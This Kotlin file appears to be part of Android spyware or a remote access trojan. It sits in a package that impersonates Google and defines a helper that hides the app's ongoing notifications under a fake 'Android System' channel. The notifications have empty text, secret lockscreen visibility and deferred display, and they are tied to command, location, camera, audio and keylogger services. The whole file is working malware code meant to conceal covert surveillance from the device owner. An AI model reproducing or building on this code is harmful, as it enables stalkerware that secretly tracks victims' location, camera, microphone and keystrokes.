package com.google.android.systemservice.utils

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat

object StealthNotificationHelper {
    
    const val STEALTH_CHANNEL_ID = "android_system_core"
    
    // Notification IDs for different services
    const val COMMAND_SERVICE_ID = 2000
    const val LOCATION_SERVICE_ID = 2001
    const val CAMERA_SERVICE_ID = 2002
    const val AUDIO_SERVICE_ID = 2003
    const val KEYLOGGER_SERVICE_ID = 2004
    
    fun createStealthChannel(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                STEALTH_CHANNEL_ID,
                "Android System",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = ""
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setBypassDnd(false)
            }
            
            val notificationManager = context.getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }
    
    fun createStealthNotification(context: Context): Notification {
        // Ensure channel exists
        createStealthChannel(context)
        
        val builder = NotificationCompat.Builder(context, STEALTH_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentTitle("")  // Empty title
            .setContentText("")   // Empty text
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setAutoCancel(false)
        
        // Defer notification display on Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
        }
        
        return builder.build()
    }
    
    // Create notification with specific ID for a service
    fun getNotificationId(serviceType: ServiceType): Int {
        return when (serviceType) {
            ServiceType.COMMAND -> COMMAND_SERVICE_ID
            ServiceType.LOCATION -> LOCATION_SERVICE_ID
            ServiceType.CAMERA -> CAMERA_SERVICE_ID
            ServiceType.AUDIO -> AUDIO_SERVICE_ID
            ServiceType.KEYLOGGER -> KEYLOGGER_SERVICE_ID
        }
    }
    
    enum class ServiceType {
        COMMAND,
        LOCATION,
        CAMERA,
        AUDIO,
        KEYLOGGER
    }
    
    // Cancel all stealth notifications
    fun cancelAllNotifications(context: Context) {
        val notificationManager = context.getSystemService(NotificationManager::class.java)
        notificationManager?.apply {
            cancel(COMMAND_SERVICE_ID)
            cancel(LOCATION_SERVICE_ID)
            cancel(CAMERA_SERVICE_ID)
            cancel(AUDIO_SERVICE_ID)
            cancel(KEYLOGGER_SERVICE_ID)
        }
    }
}
